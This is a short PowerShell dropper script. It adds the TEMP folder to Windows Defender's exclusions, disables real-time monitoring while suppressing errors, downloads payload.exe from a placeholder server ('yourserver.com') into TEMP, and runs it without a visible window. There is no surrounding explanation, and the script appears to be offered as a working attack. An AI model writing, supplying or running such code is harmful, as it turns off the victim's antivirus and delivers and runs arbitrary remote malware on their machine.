Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

$payloadUrl = "http://yourserver.com/payload.exe"
$payloadPath = "$env:TEMP\payload.exe"

$wc = New-Object System.Net.WebClient
$wc.DownloadFile($payloadUrl, $payloadPath)

Start-Process -FilePath $payloadPath -NoNewWindow
